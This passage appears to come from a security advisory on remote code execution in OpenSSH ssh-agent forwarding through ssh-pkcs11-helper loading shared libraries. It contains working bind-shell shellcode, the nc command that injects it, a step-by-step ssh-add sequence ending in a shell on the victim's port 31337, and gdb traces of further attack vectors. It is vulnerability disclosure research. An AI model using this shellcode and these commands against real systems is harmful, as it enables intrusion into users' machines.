server# SHELLCODE=$'\x48\x31\xc0\x48\x31\xff\x48\x31\xf6\x48\x31\xd2\x4d\x31\xc0\x6a\x02\x5f\x6a\x01\x5e\x6a\x06\x5a\x6a\x29\x58\x0f\x05\x49\x89\xc0\x4d\x31\xd2\x41\x52\x41\x52\xc6\x04\x24\x02\x66\xc7\x44\x24\x02\x7a\x69\x48\x89\xe6\x41\x50\x5f\x6a\x10\x5a\x6a\x31\x58\x0f\x05\x41\x50\x5f\x6a\x01\x5e\x6a\x32\x58\x0f\x05\x48\x89\xe6\x48\x31\xc9\xb1\x10\x51\x48\x89\xe2\x41\x50\x5f\x6a\x2b\x58\x0f\x05\x59\x4d\x31\xc9\x49\x89\xc1\x4c\x89\xcf\x48\x31\xf6\x6a\x03\x5e\x48\xff\xce\x6a\x21\x58\x0f\x05\x75\xf6\x48\x31\xff\x57\x57\x5e\x5a\x48\xbf\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x48\xc1\xef\x08\x57\x54\x5f\x6a\x3b\x58\x0f\x05'

server# (perl -e 'print "\0\0\x27\xbf\x14\0\0\0\x10/usr/lib/modules\0\0\x27\xa6" . "\x90" x 10000'; echo -n "$SHELLCODE") | nc -U "$SSH_AUTH_SOCK"
[Press Ctrl-C after a few seconds.]

------------------------------------------------------------------------

3c/ we remotely alter the mmap layout of ssh-pkcs11-helper:

server# ssh-add -s /usr/lib/pulse-15.0+dfsg1/modules/module-remap-sink.so
Enter passphrase for PKCS#11: whatever
Could not add card "/usr/lib/pulse-15.0+dfsg1/modules/module-remap-sink.so": agent refused operation

------------------------------------------------------------------------

3d/ we remotely register a SIGBUS handler, and immediately munmap() its
code:

server# ssh-add -s /usr/lib/x86_64-linux-gnu/libgnatcoll_postgres.so.1
Enter passphrase for PKCS#11: whatever
Could not add card "/usr/lib/x86_64-linux-gnu/libgnatcoll_postgres.so.1": agent refused operation

------------------------------------------------------------------------

3e/ we remotely alter the mmap layout of ssh-pkcs11-helper (again), and
replace the unmapped SIGBUS handler's code with another piece of code (a
useful gadget) from another shared library:

server# ssh-add -s /usr/lib/pulse-15.0+dfsg1/modules/module-http-protocol-unix.so
server# ssh-add -s /usr/lib/x86_64-linux-gnu/sane/libsane-hp.so.1.0.32
server# ssh-add -s /usr/lib/libreoffice/program/libindex_data.so
server# ssh-add -s /usr/lib/x86_64-linux-gnu/gstreamer-1.0/libgstaudiorate.so
server# ssh-add -s /usr/lib/libreoffice/program/libscriptframe.so
server# ssh-add -s /usr/lib/x86_64-linux-gnu/libisccc-9.16.15-Ubuntu.so
server# ssh-add -s /usr/lib/x86_64-linux-gnu/libxkbregistry.so.0.0.0

------------------------------------------------------------------------

3f/ we remotely raise a SIGBUS in ssh-pkcs11-helper:

server# ssh-add -s /usr/lib/debug/.build-id/15/c0bee6bcb06fbf381d0e0e6c52f71e1d1bd694.debug
Enter passphrase for PKCS#11: whatever
[Press Ctrl-C after a few seconds.]

------------------------------------------------------------------------

3g/ the replacement code (gadget) is executed (instead of the unmapped
SIGBUS handler's code) and jumps to the stack, then into our shellcode,
which binds a shell on TCP port 31337 on Alice's workstation:

server# nc -v workstation 31337
Connection to workstation 31337 port [tcp/*] succeeded!

workstation$ id
uid=1000(alice) gid=1000(alice) groups=1000(alice),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),122(lpadmin),133(lxd),134(sambashare)

workstation$ ps axuf
USER         PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
...
alice        912  0.0  0.0   6060  2312 ?        Ss   17:18   0:00 ssh-agent -s
alice        928  0.0  0.0   2872   956 ?        S    17:25   0:00  \_ [sh]
alice        953  0.0  0.0   7060  3068 ?        R    17:40   0:00      \_ ps axuf

------------------------------------------------------------------------

To get a clear view of the replacement code (the useful gadget) that is
executed instead of the unmapped SIGBUS handler and that jumps into the
NOP sled of our shellcode (in the executable stack), we relaunch our
attack against ssh-agent and attach to ssh-pkcs11-helper with gdb:

workstation$ gdb /usr/lib/openssh/ssh-pkcs11-helper 1225
...
(gdb) continue
Continuing.

Program received signal SIGBUS, Bus error.
memset () at ../sysdeps/x86_64/multiarch/memset-vec-unaligned-erms.S:186

(gdb) stepi
0x00007f2ba9d7c350 in ?? () from /usr/lib/libreoffice/program/libuno_cppuhelpergcc3.so.3

(gdb) x/10i 0x00007f2ba9d7c350
=> 0x7f2ba9d7c350:      add    $0x28,%rsp
   0x7f2ba9d7c354:      mov    %r12,%rax
   0x7f2ba9d7c357:      pop    %rbx
   0x7f2ba9d7c358:      pop    %rbp
   0x7f2ba9d7c359:      pop    %r12
   0x7f2ba9d7c35b:      pop    %r13
   0x7f2ba9d7c35d:      pop    %r14
   0x7f2ba9d7c35f:      pop    %r15
   0x7f2ba9d7c361:      ret
   ...

(gdb) stepi
...
0x00007f2ba9d7c361 in ?? () from /usr/lib/libreoffice/program/libuno_cppuhelpergcc3.so.3

(gdb) stepi
0x00007fff7aae5e90 in ?? ()

(gdb) x/10i 0x00007fff7aae5e90
=> 0x7fff7aae5e90:      add    %dl,(%rax)
   0x7fff7aae5e92:      and    %eax,(%rax)
   0x7fff7aae5e94:      add    %al,(%rax)
   0x7fff7aae5e96:      add    %al,(%rax)
   0x7fff7aae5e98:      add    %ah,(%rax)
   0x7fff7aae5e9a:      and    %eax,(%rax)
   0x7fff7aae5e9c:      add    %al,(%rax)
   0x7fff7aae5e9e:      add    %al,(%rax)
   0x7fff7aae5ea0:      call   0x7fff7aae7fbe
   ...

(gdb) stepi
...
0x00007fff7aae5ea0 in ?? ()

(gdb) stepi
0x00007fff7aae7fbe in ?? ()

(gdb) x/10i 0x00007fff7aae7fbe
=> 0x7fff7aae7fbe:      nop
   0x7fff7aae7fbf:      nop
   0x7fff7aae7fc0:      nop
   0x7fff7aae7fc1:      nop
   0x7fff7aae7fc2:      nop
   0x7fff7aae7fc3:      nop
   0x7fff7aae7fc4:      nop
   0x7fff7aae7fc5:      nop
   0x7fff7aae7fc6:      nop
   0x7fff7aae7fc7:      nop

(gdb) !grep stack /proc/1225/maps
7fff7aacb000-7fff7aaeb000 rwxp 00000000 00:00 0                          [stack]

========================================================================
Callback function use-after-free
========================================================================

While analyzing the first results of our fuzzer, we noticed that some
combinations of shared libraries jump to the stack although they do not
register any signal handler or raise any signal; how is this possible?
On investigation, we understood that:

- a core library (for example, libgcrypt.so or libQt5Core.so) is loaded
  but not unloaded (munmap()ed) by dlclose(), because it is marked as
  "nodelete" by the loader;

- a shared library (for example, libgnunetutil.so or gammaray_probe.so)
  is loaded and registers a userland callback function with the core
  library (via gcry_set_allocation_handler() or qtHookData[], for
  example), but it does not deregister this callback function when
  dlclose()d (i.e., when its code is munmap()ed);

- another shared library is loaded (mmap()ed) and replaces the unmapped
  callback function's code with another piece of code (a useful gadget);

- yet another shared library is loaded and calls one of the core
  library's functions, which in turn calls the unmapped callback
  function and therefore executes the replacement code (the useful
  gadget) instead, thus jumping to the stack.

------------------------------------------------------------------------

In the following example, one of the core library's functions is called
at line 66254, the unmapped callback function is called at line 66288,
the replacement code (gadget) is executed instead at line 66289, and
jumps to the stack at line 66293 (ssh-pkcs11-helper segfaults here
because we did not make the stack executable):

Attaching to program: /usr/lib/openssh/ssh-pkcs11-helper, process 3628979
...
(gdb) record btrace
(gdb) continue
Continuing.

Program received signal SIGSEGV, Segmentation fault.
0x00007fff5000d9d0 in ?? ()

(gdb) !grep stack /proc/3628979/maps
7fff4fff3000-7fff50014000 rw-p 00000000 00:00 0                          [stack]

(gdb) set record instruction-history-size 100
(gdb) record instruction-history
...
66254      0x00007f9ae7d82df4:  call   0x7f9ae7d70180 <gcry_mpi_new@plt>
66255      0x00007f9ae7d70180 <gcry_mpi_new@...+0>:     endbr64
66256      0x00007f9ae7d70184 <gcry_mpi_new@...+4>:     bnd jmp *0x7aa9d(%rip)        # 0x7f9ae7deac28 <gcry_mpi_new@....plt>
66257      0x00007f9af801bbe0 <gcry_mpi_new+0>: endbr64
66258      0x00007f9af801bbe4 <gcry_mpi_new+4>: push   %r12
66259      0x00007f9af801bbe6 <gcry_mpi_new+6>: push   %rbx
66260      0x00007f9af801bbe7 <gcry_mpi_new+7>: lea    0x3f(%rdi),%ebx
66261      0x00007f9af801bbea <gcry_mpi_new+10>:        mov    $0x18,%edi
66262      0x00007f9af801bbef <gcry_mpi_new+15>:        shr    $0x6,%ebx
66263      0x00007f9af801bbf2 <gcry_mpi_new+18>:        sub    $0x8,%rsp
66264      0x00007f9af801bbf6 <gcry_mpi_new+22>:        call   0x7f9af801bb40
66265      0x00007f9af801bb40:  endbr64
...
66285      0x00007f9af809cc60:  mov    0xa8311(%rip),%rax        # 0x7f9af8144f78
66286      0x00007f9af809cc67:  test   %rax,%rax
66287      0x00007f9af809cc6a:  jne    0x7f9af809cc44
66288      0x00007f9af809cc44:  call   *%rax

66289      0x00007f9afc27edc0:  cmp    %eax,%ebx
66290      0x00007f9afc27edc2:  jne    0x7f9afc27f150
66291      0x00007f9afc27f150:  mov    %r14,%rsi
66292      0x00007f9afc27f153:  mov    %r13,%rdi
66293      0x00007f9afc27f156:  call   *%rbx

------------------------------------------------------------------------

In the following example, the unmapped callback function is called at
line 87352, the replacement code (gadget) is executed instead at line
87353, and jumps to the stack at line 87354:

Attaching to program: /usr/lib/openssh/ssh-pkcs11-helper, process 3628993
...
(gdb) record btrace
(gdb) continue
Continuing.

Program received signal SIGSEGV, Segmentation fault.
0x00007ffe4fc16d10 in ?? ()

(gdb) !grep stack /proc/3628993/maps
7ffe4fbfc000-7ffe4fc1d000 rw-p 00000000 00:00 0                          [stack]

(gdb) set record instruction-history-size 100
(gdb) record instruction-history
...
87347      0x00007f35f8972d26 <_ZN7QObjectC2ER14QObjectPrivatePS_+182>: lea    0x26acd3(%rip),%rax        # 0x7f35f8bdda00 <qtHookData>
87348      0x00007f35f8972d2d <_ZN7QObjectC2ER14QObjectPrivatePS_+189>: mov    0x18(%rax),%rax
87349      0x00007f35f8972d31 <_ZN7QObjectC2ER14QObjectPrivatePS_+193>: test   %rax,%rax
87350      0x00007f35f8972d34 <_ZN7QObjectC2ER14QObjectPrivatePS_+196>: jne    0x7f35f8972d88 <_ZN7QObjectC2ER14QObjectPrivatePS_+280>
87351      0x00007f35f8972d88 <_ZN7QObjectC2ER14QObjectPrivatePS_+280>: mov    %rbx,%rdi
87352      0x00007f35f8972d8b <_ZN7QObjectC2ER14QObjectPrivatePS_+283>: call   *%rax

87353      0x00007f35fa445130 <_ZN5KAuth15ObjectDecorator13setAuthActionERKNS_6ActionE+80>:     pop    %rbp
87354      0x00007f35fa445131 <_ZN5KAuth15ObjectDecorator13setAuthActionERKNS_6ActionE+81>:     ret

------------------------------------------------------------------------

Note: several shared libraries that are installed by default on Ubuntu
Desktop (for example, gkm-*-store-standalone.so) do not have constructor
or destructor functions, but they are actual PKCS#11 providers, so some
of their functions are explicitly called by ssh-pkcs11-helper, and these
functions register a callback function with libgcrypt.so but they do not
deregister it when dlclose()d (i.e., when munmap()ed), thus exhibiting
the "Callback function use-after-free" behavior presented in this
subsection.

In the following example, one of libgcrypt.so's functions is called at
line 79114, the unmapped callback function is called at line 79143, the
replacement code (gadget) is executed instead at line 79144, and jumps
to the stack at line 79157:

Attaching to program: /usr/lib/openssh/ssh-pkcs11-helper, process 3629085
...
(gdb) record btrace
(gdb) continue
Continuing.

Thread 1 "ssh-pkcs11-help" received signal SIGSEGV, Segmentation fault.
0x00007fffb2735c48 in ?? ()

(gdb) !grep stack /proc/3629085/maps
7fffb2716000-7fffb2737000 rw-p 00000000 00:00 0                          [stack]

(gdb) set record instruction-history-size 100
(gdb) record instruction-history
...
79114      0x00007f8328147e3a:  call   0x7f8328135500 <gcry_mpi_scan@plt>
79115      0x00007f8328135500 <gcry_mpi_scan@...+0>:    endbr64
79116      0x00007f8328135504 <gcry_mpi_scan@...+4>:    bnd jmp *0x7a8dd(%rip)        # 0x7f83281afde8 <gcry_mpi_scan@....plt>
79117      0x00007f832e2b1220 <gcry_mpi_scan+0>:        endbr64
79118      0x00007f832e2b1224 <gcry_mpi_scan+4>:        sub    $0x8,%rsp
79119      0x00007f832e2b1228 <gcry_mpi_scan+8>:        call   0x7f832e32fbb0
79120      0x00007f832e32fbb0:  endbr64
...
79140      0x00007f832e2b436e:  mov    0x129dc3(%rip),%rax        # 0x7f832e3de138
79141      0x00007f832e2b4375:  test   %rax,%rax
79142      0x00007f832e2b4378:  je     0x7f832e2b43b0
79143      0x00007f832e2b437a:  jmp    *%rax

79144      0x00007f832ed274f0:  and    $0x20,%al
79145      0x00007f832ed274f2:  mov    %rax,0x50(%rsp)
79146      0x00007f832ed274f7:  mov    0x30(%rsp),%r13d
79147      0x00007f832ed274fc:  mov    0x58(%rsp),%r15
79148      0x00007f832ed27501:  mov    %ebx,%ebp
79149      0x00007f832ed27503:  mov    %r8d,%edx
79150      0x00007f832ed27506:  mov    0x50(%rsp),%rsi
79151      0x00007f832ed2750b:  mov    0x28(%rsp),%r14
79152      0x00007f832ed27510:  movslq 0x38(%r12),%rax
79153      0x00007f832ed27515:  sub    $0x8000,%ebp
79154      0x00007f832ed2751b:  mov    0x54(%r12),%ecx
79155      0x00007f832ed27520:  add    %rax,%r14
79156      0x00007f832ed27523:  mov    %r14,%rdi
79157      0x00007f832ed27526:  call   *%r15

========================================================================
Return from syscall use-after-free
========================================================================

While analyzing the strace logs of the dlopen() and dlclose() of every
shared library in /usr/lib*, we spotted an unusual SIGSEGV:

- a shared library is loaded, and its constructor function starts a
  thread that sleeps for 10 seconds in kernel-land:

------------------------------------------------------------------------
3631347 openat(AT_FDCWD, "/usr/lib/x86_64-linux-gnu/cmpi/libcmpiOSBase_ProcessorProvider.so", O_RDONLY|O_CLOEXEC) = 3
...
3631347 mmap(NULL, 33296, PROT_READ, MAP_PRIVATE|MAP_DENYWRITE, 3, 0) = 0x7f5f3c3fb000
3631347 mmap(0x7f5f3c3fd000, 12288, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3, 0x2000) = 0x7f5f3c3fd000
3631347 mmap(0x7f5f3c400000, 8192, PROT_READ, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3, 0x5000) = 0x7f5f3c400000
3631347 mmap(0x7f5f3c402000, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3, 0x6000) = 0x7f5f3c402000
3631347 close(3)                        = 0
...
3631347 clone3({flags=CLONE_VM|CLONE_FS|CLONE_FILES|CLONE_SIGHAND|CLONE_THREAD|CLONE_SYSVSEM|CLONE_SETTLS|CLONE_PARENT_SETTID|CLONE_CHILD_CLEARTID, child_tid=0x7f5f3bd70910, parent_tid=0x7f5f3bd70910, exit_signal=0, stack=0x7f5f3b570000, stack_size=0x7fff00, tls=0x7f5f3bd70640} => {parent_tid=[3631372]}, 88) = 3631372
...
3631372 clock_nanosleep(CLOCK_REALTIME, 0, {tv_sec=10, tv_nsec=0},  <unfinished ...>
------------------------------------------------------------------------

- meanwhile, the main thread (ssh-pkcs11-helper) unloads this shared
  library (because it is not an actual PKCS#11 provider) and therefore
  munmap()s the code where the sleeping thread should return to after
  its sleep in kernel-land:

------------------------------------------------------------------------
3631347 socket(AF_UNIX, SOCK_DGRAM|SOCK_CLOEXEC, 0) = 3
3631347 connect(3, {sa_family=AF_UNIX, sun_path="/dev/log"}, 110) = 0
3631347 sendto(3, "<35>Jun 22 18:35:25 ssh-pkcs11-helper[3631347]: error: dlsym(C_GetFunctionList) failed: /usr/lib/x86_64-linux-gnu/cmpi/libcmpiOSBase_ProcessorProvider.so: undefined symbol: C_GetFunctionList", 190, MSG_NOSIGNAL, NULL, 0) = 190
3631347 close(3)                        = 0
3631347 munmap(0x7f5f3c3fb000, 33296)   = 0
------------------------------------------------------------------------

- the sleeping thread returns from kernel-land and crashes with a
  SIGSEGV because its userland code (at 0x7f5f3c3fecff) was unmapped:

------------------------------------------------------------------------
3631372 <... clock_nanosleep resumed>0x7f5f3bd6fde0) = 0
3631372 --- SIGSEGV {si_signo=SIGSEGV, si_code=SEGV_MAPERR, si_addr=0x7f5f3c3fecff} ---
------------------------------------------------------------------------

Of course, we can request ssh-pkcs11-helper to load (mmap()) a
"nodelete" library before the sleeping thread returns from kernel-land,
thus replacing the unmapped userland code with another piece of code (a
hopefully useful gadget). In the following example, the sleeping thread
returns from kernel-land after line 214, executes the replacement code
(gadget) at line 256, and jumps to the stack at line 1305:

Attaching to program: /usr/lib/openssh/ssh-pkcs11-helper, process 3631531
...
(gdb) record btrace
(gdb) continue
Continuing.
...
Thread 2 "ssh-pkcs11-help" received signal SIGSEGV, Segmentation fault.
[Switching to Thread 0x7f4603960640 (LWP 3631561)]
0x00007ffe2196f180 in ?? ()

(gdb) !grep stack /proc/3631531/maps
7ffe21955000-7ffe21976000 rw-p 00000000 00:00 0                          [stack]

(gdb) set record instruction-history-size unlimited
(gdb) record instruction-history
...
214        0x00007f4604b71866 <__GI___clock_nanosleep+198>:     syscall
...
240        0x00007f4604b71831 <__GI___clock_nanosleep+145>:     ret
...
244        0x00007f4604b766ef <__GI___nanosleep+31>:    ret
...
255        0x00007f4604b7663d <__sleep+93>:     ret

256        0x00007f46050fecff:  jmp    0x7f4604662e54 <__ieee754_j1f128+2276>
257        0x00007f4604662e54 <__ieee754_j1f128+2276>:  movq   0x60(%rsp),%mm3
...
1304       0x00007f460466285b <__ieee754_j1f128+747>:   add    $0xc8,%rsp
1305       0x00007f4604662862 <__ieee754_j1f128+754>:   ret

========================================================================
Sigaltstack use-after-free
========================================================================

>From time to time, we noticed the following warning in the dmesg of our
fuzzing laptop:

------------------------------------------------------------------------
[585902.691238] signal: ssh-pkcs11-help[1663008] overflowed sigaltstack
------------------------------------------------------------------------

On investigation, we discovered that at least one shared library
(libgnatcoll_postgres.so) calls sigaltstack() to register an alternate
signal stack (used by SA_ONSTACK signal handlers) when dlopen()ed, and
then munmap()s this signal stack without deregistering it (SS_DISABLE)
when dlclose()d. Consequently, we implemented and tested a different
attack idea:

- we randomly load zero or more shared libraries that permanently alter
  the mmap layout;

- we load libgnatcoll_postgres.so, which registers an alternate signal
  stack and then munmap()s it without deregistering it;

- we randomly load zero or more shared libraries that alter the mmap
  layout (again), and hopefully replace the unmapped signal stack with
  another writable memory mapping (for example, a thread stack, or a
  .data or .bss segment);

- we randomly load one shared library that registers an SA_ONSTACK
  signal handler but does not munmap() its code when dlclose()d (unlike
  our original "Signal handler use-after-free" attack);

- we randomly load one shared library that raises this signal and
  therefore calls the SA_ONSTACK signal handler, thus overwriting the
  replacement memory mapping with stack frames from the signal handler;

- we randomly load one or more shared libraries that hopefully use the
  overwritten contents of the replacement memory mapping.

Although we successfully found various combinations of shared libraries
that overwrite a .data or .bss segment with a stack frame from a signal
handler, we failed to overwrite a useful memory mapping with useful data
(e.g., we failed to magically jump to the stack); for this attack to
work, more research and a finer-grained approach might be required.

========================================================================
Sigreturn to arbitrary instruction pointer
========================================================================

Astonishingly, numerous combinations of shared libraries crash because
they try to execute code at 0xcccccccccccccccc: a direct control of the
instruction pointer (RIP), because these 0xcc bytes come from the stack
buffer of ssh-pkcs11-helper that we (remote attackers) filled with 0xcc
bytes.

Initially, we got very excited by this new attack vector, because we
thought that a gadget of the form "add rsp, N; ret" was executed, thus
moving the stack pointer (RSP) into our 0xcc-filled stack buffer and
popping RIP from there. Unfortunately, the reality is more complex:

- a shared library raises a signal (a SIGSEGV in the example below, at
  line 134110) and, in consequence of a "Signal handler use-after-free",
  a replacement gadget of the form "ret N" is executed instead of the
  signal handler (at line 134111);

- exactly as the real signal handler would, the replacement gadget
  returns to the glibc's restore_rt() function (at line 134112), which
  in turn calls the kernel's rt_sigreturn() function (at line 134113);

- however, before the kernel's rt_sigreturn() function is called, the
  replacement gadget "ret N" moves RSP into our 0xcc-filled stack buffer
  and as a result, the kernel's rt_sigreturn() function restores all
  userland registers (including RIP and RSP) from there;

------------------------------------------------------------------------
Attaching to program: /usr/lib/openssh/ssh-pkcs11-helper, process 3633914
...
(gdb) record btrace
(gdb) continue
Continuing.

Program received signal SIGSEGV, Segmentation fault.
0x00007fcd468671b1 in xtables_register_target () from /lib/x86_64-linux-gnu/libxtables.so.12

(gdb) x/i 0x00007fcd468671b1
=> 0x7fcd468671b1 <xtables_register_target+209>:        movzbl 0x18(%rax),%eax

(gdb) info registers
rax            0x0                 0
...

(gdb) continue
Continuing.

Program received signal SIGSEGV, Segmentation fault.
0xcccccccccccccccc in ?? ()

(gdb) set record instruction-history-size 100
(gdb) record instruction-history
...
134106     0x00007fcd4686719e <xtables_register_target+190>:    mov    0x6e1b(%rip),%rax        # 0x7fcd4686dfc0
134107     0x00007fcd468671a5 <xtables_register_target+197>:    movzwl 0x22(%rbx),%edx
134108     0x00007fcd468671a9 <xtables_register_target+201>:    mov    (%rax),%rax
134109     0x00007fcd468671ac <xtables_register_target+204>:    mov    %dx,0x6(%rsp)
134110  [disabled]
134111     0x00007fcd48e434a0:  ret    $0x1f0f
134112     0x00007fcd49655520 <__restore_rt+0>: mov    $0xf,%rax
134113     0x00007fcd49655527 <__restore_rt+7>: syscall

(gdb) info registers
rax            0x0                 0
rbx            0xcccccccccccccccc  -3689348814741910324
rcx            0xcccccccccccccccc  -3689348814741910324
rdx            0xcccccccccccccccc  -3689348814741910324
rsi            0xcccccccccccccccc  -3689348814741910324
rdi            0xcccccccccccccccc  -3689348814741910324
rbp            0xcccccccccccccccc  0xcccccccccccccccc
rsp            0xcccccccccccccccc  0xcccccccccccccccc
r8             0xcccccccccccccccc  -3689348814741910324
r9             0xcccccccccccccccc  -3689348814741910324
r10            0xcccccccccccccccc  -3689348814741910324
r11            0xcccccccccccccccc  -3689348814741910324
r12            0xcccccccccccccccc  -3689348814741910324
r13            0xcccccccccccccccc  -3689348814741910324
r14            0xcccccccccccccccc  -3689348814741910324
r15            0xcccccccccccccccc  -3689348814741910324
rip            0xcccccccccccccccc  0xcccccccccccccccc
------------------------------------------------------------------------

Although we directly control all of the userland registers, we failed to
transform this attack vector into a one-shot remote exploit, because RSP
(which was conveniently pointing into our 0xcc-filled stack buffer) gets
overwritten, and because we were unable to leak any information from
ssh-pkcs11-helper (to defeat ASLR).

Partially overwriting a pointer that is left over in ssh-pkcs11-helper's
stack buffer, and that is later used by rt_sigreturn() to restore a
userland register, might be an interesting idea that we have not
explored yet.

========================================================================
_Unwind_Context type-confusion
========================================================================

This attack vector was the most puzzling of our discoveries: from time
to time, some combinations of shared libraries jumped to the stack, but
evidently not as a result of a signal handler, callback function, or
return from syscall use-after-free. Eventually, we determined the
sequence of events that led to these stack jumps:

- some shared libraries load LLVM's libunwind.so as a "nodelete" library
  (i.e., it is never unloaded, even after dlclose());

- some shared libraries throw a C++ exception, which loads GCC's
  libgcc_s.so and calls the _Unwind_GetCFA() function (at line 57295 in
  the example below);

- however, GCC's libgcc_s.so mistakenly calls LLVM's _Unwind_GetCFA()
  (at line 57298) instead of GCC's _Unwind_GetCFA() (because LLVM's
  libunwind.so was loaded first), and passes a pointer to GCC's struct
  _Unwind_Context to this function (instead of a pointer to LLVM's
  struct _Unwind_Context, which is a different type of structure);

- LLVM's _Unwind_GetCFA() then calls its unw_get_reg() function (at line
  57303), which in turn calls a function pointer (at line 57311) that is
  a member of LLVM's struct _Unwind_Context, but that happens to be a
  stack pointer in GCC's struct _Unwind_Context;

------------------------------------------------------------------------
Attaching to program: /usr/lib/openssh/ssh-pkcs11-helper, process 3635541
...
(gdb) record btrace
(gdb) continue
Continuing.

Program received signal SIGSEGV, Segmentation fault.
0x00007ffcf5e9be10 in ?? ()

(gdb) !grep stack /proc/3635541/maps
7ffcf5e82000-7ffcf5ea3000 rw-p 00000000 00:00 0                          [stack]

(gdb) set record instruction-history-size 100
(gdb) record instruction-history
...
57295      0x00007f7c8eaaccf1:  call   0x7f7c8ea99470 <_Unwind_GetCFA@plt>

57296      0x00007f7c8ea99470 <_Unwind_GetCFA@...+0>:   endbr64
57297      0x00007f7c8ea99474 <_Unwind_GetCFA@...+4>:   bnd jmp *0x1bc2d(%rip)        # 0x7f7c8eab50a8 <_Unwind_GetCFA@....plt>

57298      0x00007f7c8edce920 <_Unwind_GetCFA+0>:       sub    $0x18,%rsp
57299      0x00007f7c8edce924 <_Unwind_GetCFA+4>:       mov    %fs:0x28,%rax
57300      0x00007f7c8edce92d <_Unwind_GetCFA+13>:      mov    %rax,0x10(%rsp)
57301      0x00007f7c8edce932 <_Unwind_GetCFA+18>:      lea    0x8(%rsp),%rdx
57302      0x00007f7c8edce937 <_Unwind_GetCFA+23>:      mov    $0xfffffffe,%esi
57303      0x00007f7c8edce93c <_Unwind_GetCFA+28>:      call   0x7f7c8edca6b0 <unw_get_reg>

57304      0x00007f7c8edca6b0 <unw_get_reg+0>:  push   %rbp
57305      0x00007f7c8edca6b1 <unw_get_reg+1>:  push   %r14
57306      0x00007f7c8edca6b3 <unw_get_reg+3>:  push   %rbx
57307      0x00007f7c8edca6b4 <unw_get_reg+4>:  mov    %rdx,%r14
57308      0x00007f7c8edca6b7 <unw_get_reg+7>:  mov    %esi,%ebp
57309      0x00007f7c8edca6b9 <unw_get_reg+9>:  mov    %rdi,%rbx
57310      0x00007f7c8edca6bc <unw_get_reg+12>: mov    (%rdi),%rax
57311      0x00007f7c8edca6bf <unw_get_reg+15>: call   *0x10(%rax)

(gdb) !grep 7f7c8ea /proc/3635541/maps
7f7c8ea99000-7f7c8eab0000 r-xp 00003000 08:03 8788336                    /usr/lib/x86_64-linux-gnu/libgcc_s.so.1

(gdb) !grep 7f7c8ed /proc/3635541/maps
7f7c8edc9000-7f7c8edd1000 r-xp 00000000 08:03 11148811                   /usr/lib/llvm-14/lib/libunwind.so.1.0
------------------------------------------------------------------------

========================================================================
RCE in library constructor
========================================================================

As a last and extreme example of a remote attack against ssh-agent
forwarding, we noticed that one shared library's constructor function
(which can be invoked by a remote attacker via an ssh-agent forwarding)
starts a server thread that listens on a TCP port, and we discovered a
remotely exploitable vulnerability (a heap-based buffer overflow) in
this server's implementation.

The unusual malloc exploitation technique that we used to remotely
exploit this vulnerability is so interesting (it is reliable, one-shot,
and works against the latest glibc versions, despite all the modern
protections) that we decided to publish it in a separate advisory:

    <https://na01.safelinks.protection.outlook.com/?url=https%3A%2F%2Fwww.qualys.com%2F2023%2F06%2F06%2Frenderdoc%2Frenderdoc.txt&data=05%7C01%7C%7Ce12d96774c13433add7108db8875ffb9%7C84df9e7fe9f640afb435aaaaaaaaaaaa%7C1%7C0%7C638253812632612226%7CUnknown%7CTWFpbGZsb3d8eyJWIjoiMC4wLjAwMDAiLCJQIjoiV2luMzIiLCJBTiI6Ik1haWwiLCJXVCI6Mn0%3D%7C3000%7C%7C%7C&sdata=nofBS%2FHzMRkvCgf%2FnCVxTNk7qQdAy84QcWuVMsaxPl4%3D&reserved=0><<https://www.qualys.com/2023/06/06/renderdoc/renderdoc.txt>>

This last and extreme attack vector against ssh-agent also underlines
the central point of this advisory: many shared libraries are simply not
safe to be loaded (and unloaded) in a security-sensitive program such as
ssh-agent.

========================================================================
Discussion
========================================================================

We believe that we have not exploited the full potential of this
"dlopen() then dlclose()" primitive:

- we have only investigated Ubuntu Desktop 22.04 and 21.10, but other
  versions, distributions, or operating systems might be hiding further
  surprises;

- our rudimentary fuzzer can certainly be greatly improved, and has
  definitely not tried all the combinations of shared libraries and side
  effects;

- we have identified seven attack vectors against ssh-agent (described
  in the "Results" section), but we have not analyzed in detail all the
  results of our fuzzer;

- we have not fully explored various aspects of these attack vectors:

  - it might be possible to reliably exploit the "Sigaltstack
    use-after-free" (by carefully overwriting the .data or .bss segment
    of a shared library) or the "Sigreturn to arbitrary instruction
    pointer" (by partially overwriting a leftover pointer in
    ssh-pkcs11-helper's stack);

  - we currently store our shellcode in ssh-pkcs11-helper's main() stack
    buffer only, but it might be possible to store shellcode in other
    stack buffers as well, or somehow spray the stack with shellcode,
    which would dramatically increase our chances of jumping into our
    shellcode;

    for example, we tried to spray the stack with shellcode by
    interrupting a memcpy() of controlled data with a signal handler,
    thereby spilling controlled YMM registers to the stack (inspired by
    <https://na01.safelinks.protection.outlook.com/?url=https%3A%2F%2Fbugs.chromium.org%2Fp%2Fproject-zero%2Fissues%2Fdetail%3Fid%3D2266&data=05%7C01%7C%7Ce12d96774c13433add7108db8875ffb9%7C84df9e7fe9f640afb435aaaaaaaaaaaa%7C1%7C0%7C638253812632612226%7CUnknown%7CTWFpbGZsb3d8eyJWIjoiMC4wLjAwMDAiLCJQIjoiV2luMzIiLCJBTiI6Ik1haWwiLCJXVCI6Mn0%3D%7C3000%7C%7C%7C&sdata=mYENYDFpftGaac%2B5%2BGJcg%2FAKFVZhh%2BIyb6TLmRaMsfI%3D&reserved=0>)<<https://bugs.chromium.org/p/project-zero/issues/detail?id=2266>>, but
    we failed because we can memcpy() only ~10KB of data, and because we
    cannot remotely use tricks such as inotify or sched*() to precisely
    time this race;

  - it might be possible to control the mmap layout of ssh-pkcs11-helper
    with page precision (which would allow us to precisely control the
    gadget that replaces the unmapped signal handler, callback function,
    or return from syscall), but we failed to find large malloc()ations
    (which are mmap()ed) in ssh-pkcs11-helper (the only way we found to
    influence the mmap layout is to load and unload shared libraries, as
    mentioned in Step 4a/ of the "Experiments" section);

  - instead of replacing the unmapped signal handler or callback
    function (or return from syscall) with a gadget from another shared
    library, it is perfectly possible to replace it with an executable
    thread stack (made executable by loading an "execstack" library),
    but we have failed so far to control the contents of such a thread
    stack.

========================================================================
Acknowledgments
========================================================================

We thank the OpenSSH developers, and Damien Miller in particular, for
their outstanding work on this vulnerability and on OpenSSH in general.
